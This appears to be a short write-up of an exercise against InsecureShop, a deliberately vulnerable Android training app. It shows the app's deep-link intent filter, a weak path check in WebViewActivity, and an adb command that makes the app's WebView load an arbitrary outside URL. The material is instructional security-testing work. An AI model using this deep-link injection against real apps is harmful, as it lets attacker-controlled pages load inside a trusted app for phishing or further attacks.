Checking manifest revealed the following content.
```xml
<activity android:name=".WebViewActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />

        <data
            android:host="com.insecureshop"
            android:scheme="insecureshop" />
    </intent-filter>
</activity>
```


In `com.insecureshop.WebViewActivity`, we can see hpw the urls which are sent via deep links are getting handled.

```java
if (!StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)) {
  ....
}
```

There is a check to validate that the URI path is equal to /web and after that the parameter url is being extracted from an intent to a parameter named data which later is being loaded in a webview. This is really interesting as we can construct such a URI and pass an arbitrary parameter as a url. We are going to do that by using adb.
The following command does that.
`adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=https://yasuu.free.nf"`

